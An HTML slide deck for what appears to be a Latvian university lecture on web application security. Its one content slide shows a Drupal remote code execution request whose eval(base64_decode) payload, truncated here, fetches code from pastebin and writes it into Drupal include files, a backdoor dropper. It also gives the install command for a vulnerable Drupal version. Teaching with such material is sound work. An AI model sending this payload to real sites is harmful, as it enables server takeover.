@@ -1,0 +1,155 @@
+<!doctype html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+		<title>web teh</title>
+
+		<link rel="stylesheet" href="css/reveal.css">
+		<link rel="stylesheet" href="css/theme/black.css">
+
+		<!-- Theme used for syntax highlighting of code -->
+		<link rel="stylesheet" href="lib/css/zenburn.css">
+		
+		<link rel="stylesheet" href="lekcijas.css">
+
+		<!-- highlighter -->
+		<script type="text/javascript" src="sxh/syntaxhighlighter.js"></script> 
+<!-- 		<link href="sxh/theme-default.css" rel="stylesheet" type="text/css" /> -->
+<!-- 		<link href="sxh/theme-django.css" rel="stylesheet" type="text/css" /> -->
+<!-- 		<link href="sxh/theme-rdark.css" rel="stylesheet" type="text/css" /> -->
+		<link href="sxh/theme-midnight.css" rel="stylesheet" type="text/css" />
+
+		<!-- Printing and PDF exports -->
+		<script>
+			var link = document.createElement( 'link' );
+			link.rel = 'stylesheet';
+			link.type = 'text/css';
+			link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
+			document.getElementsByTagName( 'head' )[0].appendChild( link );
+		</script>
+	</head>
+	<body>
+		<div class="reveal">
+			<div class="slides">
+			
+<section data-markdown><textarea data-template>
+## 15. Web aplikāciju drošība
+
+
+Note: 
+</textarea></section>
+
+
+<section data-markdown><textarea data-template>
+### Drošība
+
+Kas notiek, ja izpilda šo pieprasījumu uz nedrošas Drupal versijas?
+* /?q=user%2Fpassword&name%5B%23post_render
+* %5D%5B%5D=array_map&name%5B%23suffix%5D
+* =eval%28base64_decode%28%22JGt1cmQ9YmFzZTY0X2RlY29kZSgiUEQ5d2FIQU5DbWxtS0dsemMyVjBLQ1JmUjBWVVd5SnJkWEprSWwwcEtRMEtDWHNOQ2lSMFpYaDBJRDBnWm1sc1pWOW5aWFJmWTI5dWRHVnVkSE1vSjJoMGRIQnpPaTh2Y0dGemRHVmlhVzR1WTI5dEwzSmhkeTlRVkV4aFZIRjJhQ2NwT3cwS0pHOXdaVzQ5Wm05d1pXNG9JbWx1WTJ4MVpHVnpMM0psY1hWbGMzUXRjMkZ1YVhScGVtVnlMbWx1WXlJc0lDSjNJaWs3RFFwbWQzSnBkR1VvSkc5d1pXNHNJQ1IwWlhoMEtUc05DbVpqYkc5elpTZ2tiM0JsYmlrN0RRb2tkR1Y0ZERJZ1BTQm1hV3hsWDJkbGRGOWpiMjUwWlc1MGN5Z25hSFIwY0hNNkx5OXdZWE4wWldKcGJpNWpiMjB2Y21GM0wyb3dibTF6TlRsV0p5azdEUW9rYjNCbGJqSTlabTl3Wlc0b0ltbHVZMngxWkdWekwySnZiM1J6ZEhKaGNDNXBibU1pTENBaWR5SXBPdzBLWm5keWFYUmxLQ1J2Y0dWdU1pd2dKSFJsZUhReUtUc05DbVpqYkc5elpTZ2tiM0JsYmpJcE93MEtKR3QxY21RZ1BYVnViR2x1YXloZlgwWkpURVZmWHlrN0RRcHBaaUFvSkd0MWNtUXBleUJsWTJodklDSlBheUk3SUgxbGJITmxleUJsWTJodklDSmxjbkp2Y2lJN0lIMTlEUW9OQ2cwS1pYSnliM0pmY21Wd2IzSjBhVzVuS0RBcE93MEtaV05vYnlBaVUyRnlZVjlOZFdodFlXUkZiV0ZrSWpzTkNtWjFibU4wYVc5dUlGSmhibVJ2YlNna2JHVnVaM1JvSUQwZ05Da2dldzBLSUNBZ0lDUndhWFFnUFNBbllXSmpaR1ZtWjJocGFtdHNiVzV2Y0hGeWMzUjFkbmQ0ZVhvbk93MEtJQ0FnSUNSeVlXNWtjeUE5SUNjbk93MEtJQ0FnSUdadmNpQW9KR2tnUFNBd095QWthU0E4SUNSc1pXNW5kR2c3SUNScEt5c3BJSHNOQ2lBZ0lDQWdJQ0FnSkhKaGJtUnpJQzQ5SUNSd2FYUmJjbUZ1WkNnd0xDQnpkSEpzWlc0b0pIQnBkQ2tnTFNBeEtWMDdEUW9nSUNBZ2ZRMEtJQ0FnSUhKbGRIVnliaUFrY21GdVpITTdEUXA5RFFva2NtRnVJRDBnVW1GdVpHOXRLQ2s3RFFwbFkyaHZJQ2M4WVNCb2NtVnpaR1JrWmowaUp5NGlKSEpoYmlJdUp5SStKenNOQ2lSbWFXeGxNU0E5SUNjOFAzQm9jQTBLWlhKeWIzSmZjbVZ3YjNKMGFXNW5LREFwT3cwS2FXWW9hWE56WlhRb0pGOUhSVlJiSnk0aUpISmhiaUl1SjEwcEtRMEtDWHNOQ2drSlpXTm9ieUk4Wm05dWRDQmpiMnh2Y2owalJrWkdSa1pHUGx0MWJtRnRaVjBpTG5Cb2NGOTFibUZ0WlNncExpSmJMM1Z1WVcxbFhUeGljajRpT3cwS0NRbGxZMmh2SUNJOFptOXVkQ0JqYjJ4dmNqMGpSa1pHUmtaR1BsdHdkMlJkSWk1blpYUmpkMlFvS1M0aVd5OXdkMlJkUEdKeVBpSTdEUW9KQ1hCeWFXNTBJQ0pjYmlJN0pHUnBjMkZpYkdWZlpuVnVZM1JwYjI1eklEMGdRR2x1YVY5blpYUW9JbVJwYzJGaWJHVmZablZ1W
+* Instalācija:
+  * composer create-project drupal/drupal:8.5.0 darbs_security
+
+Note: 
+</textarea></section>
+
+
+<!--
+
+
+Sample 1: Markdown
+
+
+<section data-markdown><textarea data-template>
+### 
+
+* 
+
+Note: 
+</textarea></section>
+
+
+Sample 3: Highlighted code sample (still need to escape < symbols)
+
+
+<section>
+<h3></h3>
+
+<ul>
+<li>
+</ul>
+
+<pre class="brush: php">
+
+</pre>
+
+</section>
+
+
+Sample 4: Bullets and highlighted code sample (still need to escape < symbols)
+
+
+<section>
+<h3></h3>
+
+<ul>
+<li>
+<ul>
+<li>
+</ul>
+</ul>
+
+<pre class="brush: php">
+
+</pre>
+
+</section>
+
+
+Sample 5: Bullets and regular code sample
+
+
+<section>
+<h3></h3>
+
+<ul>
+<li>
+<ul>
+<li>
+</ul>
+</ul>
+
+<pre><code data-trim data-noescape>
+
+</code></pre>
+
+</section>
+-->
+				
+			</div>
+		</div>
+
+		<script src="lib/js/head.min.js"></script>
+		<script src="js/reveal.js"></script>
+
+		<script>
+			// More info about config & dependencies:
+			// - https://github.com/hakimel/reveal.js#configuration
+			// - https://github.com/hakimel/reveal.js#dependencies
+			Reveal.initialize({
+				dependencies: [
+					{ src: 'plugin/markdown/marked.js' },
+					{ src: 'plugin/markdown/markdown.js' },
+					{ src: 'plugin/notes/notes.js', async: true },
+					{ src: 'plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } }
+				]
+			});
+		</script>
+		
+		<!-- Finally, to actually run the highlighter, you need to include this JS on your page -->
+
+
+	</body>
+</html>
